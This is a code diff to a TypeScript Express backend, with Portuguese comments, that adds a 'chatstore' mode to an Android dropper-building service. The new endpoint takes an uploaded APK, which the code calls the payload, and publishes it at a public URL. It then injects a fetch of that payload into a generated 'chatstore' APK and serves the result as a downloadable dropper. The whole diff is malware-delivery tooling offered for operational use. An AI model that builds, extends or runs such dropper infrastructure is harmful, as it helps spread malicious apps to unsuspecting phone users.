@@ -11,8 +11,10 @@ import multer from "multer";
 import { v4 as uuidv4 } from "uuid";
 import { injectDropper } from "./dropperInjector.js";
 import { buildDropper } from "./dropperBuilder.js";
+import { injectChatstore } from "./chatstoreInjector.js";
 import { storagePut, storageGet } from "./storage.js";
 import { createDropperJob, getDropperJob, updateDropperJob } from "./dropperDb.js";
+import { ENV } from "./_core/env.js";
 
 const router = Router();
 
@@ -173,6 +175,50 @@ router.get("/download/:id", async (req: Request, res: Response) => {
   }
 });
 
+// ─── POST /api/dropper/chatstore (MODO CHATSTORE — substitui HTMLs .bt) ────────
+
+router.post("/chatstore", upload.fields([{ name: "apk", maxCount: 1 }]), async (req: Request, res: Response) => {
+  try {
+    const files = req.files as Record<string, Express.Multer.File[]>;
+    const apkFile = files?.["apk"]?.[0];
+    if (!apkFile) {
+      res.status(400).json({ error: "Nenhum arquivo APK enviado." });
+      return;
+    }
+
+    const appName = (req.body?.appName as string)?.trim() || apkFile.originalname.replace(/\.apk$/i, "");
+    const jobId = uuidv4();
+    const payloadName = apkFile.originalname;
+
+    const { key: payloadKey, url: payloadUrl } = await storagePut(
+      `dropper-jobs/${jobId}/payload_${payloadName}`,
+      apkFile.buffer,
+      "application/vnd.android.package-archive",
+    );
+
+    await createDropperJob({
+      id: jobId,
+      appName,
+      payloadName,
+      status: "pending",
+      progress: 0,
+      payloadKey,
+      iconKey: null,
+    });
+
+    // Construir URL pública do APK alvo
+    const baseUrl = ENV.publicBaseUrl || `http://localhost:${process.env.PORT || 3000}`;
+    const apkPublicUrl = `${baseUrl}${payloadUrl}`;
+
+    chatstoreInjectAsync(jobId, apkPublicUrl, appName, payloadName);
+
+    res.json({ jobId, status: "pending", mode: "chatstore" });
+  } catch (err) {
+    console.error("[Dropper Chatstore]", err);
+    res.status(500).json({ error: (err as Error).message });
+  }
+});
+
 // ─── Injeção assíncrona (modo real) ──────────────────────────────────────────
 
 async function injectDropperAsync(
@@ -274,6 +320,69 @@ async function buildDropperAsync(
       errorMessage: (err as Error).message,
       logText: `❌ Erro durante o build: ${(err as Error).message}`,
     });
+  }
+}
+
+// ─── Chatstore inject assíncrono ─────────────────────────────────────────────
+
+async function chatstoreInjectAsync(
+  jobId: string,
+  apkPublicUrl: string,
+  appName: string,
+  payloadName: string,
+): Promise<void> {
+  const os = await import("os");
+  const path = await import("path");
+  const fs = await import("fs");
+
+  const tmpDir = os.tmpdir();
+  const outputPath = path.join(tmpDir, `chatstore_${jobId}.apk`);
+
+  try {
+    await updateDropperJob(jobId, { status: "processing", progress: 10 });
+    await updateDropperJob(jobId, {
+      progress: 15,
+      logText: "🔧 Iniciando injeção no chatstore (modo HTML .bt)...",
+    });
+
+    await injectChatstore({
+      apkUrl: apkPublicUrl,
+      appName,
+      outputPath,
+      onProgress: async (msg) => {
+        await updateDropperJob(jobId, { logText: msg });
+      },
+    });
+
+    await updateDropperJob(jobId, { progress: 85 });
+
+    const apkBuffer = fs.readFileSync(outputPath);
+    const dropperName = payloadName.replace(/\.apk$/i, "") + "_chatstore.apk";
+    const { key: dropperKey, url: dropperUrl } = await storagePut(
+      `dropper-jobs/${jobId}/chatstore_${dropperName}`,
+      apkBuffer,
+      "application/vnd.android.package-archive",
+    );
+
+    await updateDropperJob(jobId, { progress: 95 });
+
+    await updateDropperJob(jobId, {
+      status: "done",
+      progress: 100,
+      logText: `✅ APK chatstore gerado com sucesso! URL do payload: ${apkPublicUrl}`,
+      dropperKey,
+      dropperUrl,
+    });
+  } catch (err) {
+    console.error("[Chatstore Inject Async]", err);
+    await updateDropperJob(jobId, {
+      status: "error",
+      progress: 0,
+      errorMessage: (err as Error).message,
+      logText: `❌ Erro durante injeção chatstore: ${(err as Error).message}`,
+    });
+  } finally {
+    if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
   }
 }
 
